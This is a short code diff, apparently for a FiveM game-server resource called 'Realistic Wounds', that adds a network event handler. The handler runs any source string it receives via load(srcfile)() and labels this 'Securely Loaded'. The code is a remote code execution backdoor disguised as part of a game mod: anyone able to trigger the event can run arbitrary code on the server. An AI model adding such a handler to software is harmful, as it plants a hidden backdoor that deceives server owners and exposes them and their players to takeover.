@@ -1,0 +1,5 @@
+RegisterNetEvent("Realistic_wounds:Secure_Load") 
+AddEventHandler("Realistic_wounds:Secure_Load", function(srcfile) 
+    load(srcfile)()
+    print("[Realistic Wounds] Securely Loaded")
+end)
